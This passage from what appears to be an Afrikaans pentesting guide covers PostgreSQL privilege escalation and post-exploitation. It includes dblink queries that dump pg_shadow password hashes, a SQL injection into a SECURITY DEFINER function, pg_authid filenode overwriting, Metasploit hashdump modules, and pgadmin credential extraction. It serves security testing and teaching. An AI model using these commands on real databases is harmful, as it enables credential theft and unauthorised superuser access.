As jy die wagwoord van 'n gebruiker met meer voorregte het, maar die gebruiker nie toegelaat word om vanaf 'n eksterne IP-adres in te teken nie, kan jy die volgende funksie gebruik om navrae as daardie gebruiker uit te voer:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Dit is moontlik om te kontroleer of hierdie funksie bestaan met:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Aangepaste gedefinieerde funksie met** SECURITY DEFINER

[**In hierdie skrywe**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), kon pentesters binne 'n postgres-instansie wat deur IBM voorsien is, privesc uitvoer omdat hulle **hierdie funksie met die SECURITY DEFINER-vlag gevind het**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

Soos [**verduidelik in die dokumente**](https://www.postgresql.org/docs/current/sql-createfunction.html) word 'n funksie met **SECURITY DEFINER uitgevoer** met die voorregte van die **gebruiker wat dit besit**. Daarom, as die funksie **kwesbaar vir SQL-injeksie is** of as dit enige **bevoorregte aksies met parameters wat deur die aanvaller beheer word**, uitvoer, kan dit misbruik word om **voorregte binne postgres te eskaleer**.

In lyn 4 van die vorige kode kan jy sien dat die funksie die **SECURITY DEFINER**-vlag het.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
En voer dan **bevele** uit:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Pas Burteforce toe met PL/pgSQL

**PL/pgSQL** is 'n **volledig uitgeruste programmeringstaal** wat groter prosedurele beheer bied in vergelyking met SQL. Dit maak die gebruik van **lusse** en ander **beheerstrukture** moontlik om programlogika te verbeter. Daarbenewens het **SQL-stellings** en **triggers** die vermo√´ om funksies aan te roep wat geskep is met die **PL/pgSQL-taal**. Hierdie integrasie maak 'n meer omvattende en veelsydige benadering tot databasisprogrammering en outomatisering moontlik.\
**Jy kan hierdie taal misbruik om PostgreSQL te vra om die gebruikers se geloofsbriewe te burteforce.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### Privesc deur die Oorskryf van Interne PostgreSQL-tabelle

{% hint style="info" %}
Die volgende privesc-vektor is veral nuttig in beperkte SQLi-kontekste, aangesien alle stappe deur geneste SELECT-stellings uitgevoer kan word.
{% endhint %}

As jy **PostgreSQL-bedienerl√™ers kan lees en skryf**, kan jy **'n supergebruiker word** deur die oorskryf van die PostgreSQL op skyf filenode, wat verband hou met die interne `pg_authid`-tabel.

Lees meer oor **hierdie tegniek** [**hier**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Die aanvalstappe is:

1. Verkryg die PostgreSQL-data-gids
2. Verkryg 'n relatiewe pad na die filenode, wat verband hou met die `pg_authid`-tabel
3. Laai die filenode af deur die `lo_*`-funksies
4. Kry die datatipe wat verband hou met die `pg_authid`-tabel
5. Gebruik die [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) om die filenode te [redigeer](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table); stel alle `rol*` booleaanse vlae op 1 vir volle regte.
6. Laai die geredigeerde filenode weer op via die `lo_*`-funksies en oorskryf die oorspronklike l√™er op die skyf
7. _(Opsioneel)_ Maak die in-memory tabel-cache skoon deur 'n duur SQL-navraag uit te voer
8. Jy behoort nou die regte van 'n volle superadmin te h√™.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

Binne die _**postgresql.conf**_ l√™er kan jy postgresql logs aktiveer deur te verander:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Dan, **herlaai die diens**.

### pgadmin

[pgadmin](https://www.pgadmin.org) is 'n administrasie en ontwikkelingsplatform vir PostgreSQL.\
Jy kan **wagwoorde** binne die _**pgadmin4.db**_ l√™er vind\
Jy kan hulle ontsluit deur die _**decrypt**_ funksie binne die skriffie te gebruik: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

Kli√´ntverifikasie in PostgreSQL word bestuur deur 'n konfigurasie l√™er genaamd **pg\_hba.conf**. Hierdie l√™er bevat 'n reeks rekords, elkeen spesifiseer 'n verbindings tipe, kli√´nt IP-adres reeks (indien van toepassing), databasis naam, gebruikersnaam, en die verifikasiemetode om te gebruik vir ooreenstemmende verbindings. Die eerste rekord wat ooreenstem met die verbindings tipe, kli√´nt adres, aangevraagde databasis, en gebruikersnaam word gebruik vir verifikasie. Daar is geen terugval of rugsteun as verifikasie misluk nie. As geen rekord ooreenstem nie, word toegang geweier.

Die beskikbare wagwoord-gebaseerde verifikasiemetodes in pg\_hba.conf is **md5**, **crypt**, en **password**. Hierdie metodes verskil in hoe die wagwoord oorgedra word: MD5-gehasht, crypt-versleutel, of teks in duidelike taal. Dit is belangrik om op te let dat die crypt-metode nie gebruik kan word met wagwoorde wat versleutel is in pg\_authid nie.
